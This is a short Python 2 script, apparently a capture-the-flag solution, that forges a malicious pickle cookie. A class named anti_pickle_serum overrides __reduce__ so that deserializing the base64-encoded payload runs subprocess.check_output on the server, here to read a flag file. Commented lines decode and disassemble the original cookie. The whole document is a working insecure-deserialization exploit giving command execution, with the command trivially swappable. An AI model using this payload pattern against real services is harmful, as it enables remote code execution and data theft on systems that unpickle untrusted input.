#!/usr/bin/python2

import subprocess
import cPickle as pickle
import pickletools
import base64
import os

#create anti_pickle_serum object that the pickle cookie had
class anti_pickle_serum(object):
    def __reduce__(self):
        #create local variable that will call a command from subprocess
        cmd = ["cat", "flag_wIp1b"]
        #os.sytem doesn't return the output for the command, it just executes the commands, so we need to user subproccess.check_output, which prints the output of a command
        #
        return subprocess.check_output, (cmd,)

#the pickle we received in the cookie, had 
picklepay = pickle.dumps({'serum' : anti_pickle_serum()}, protocol=0)

print(base64.b64encode(picklepay))

#data = base64.b64decode("KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu")
#deserialized = pickle.loads(data)

#instr = pickletools.dis(data)
##print(instr)

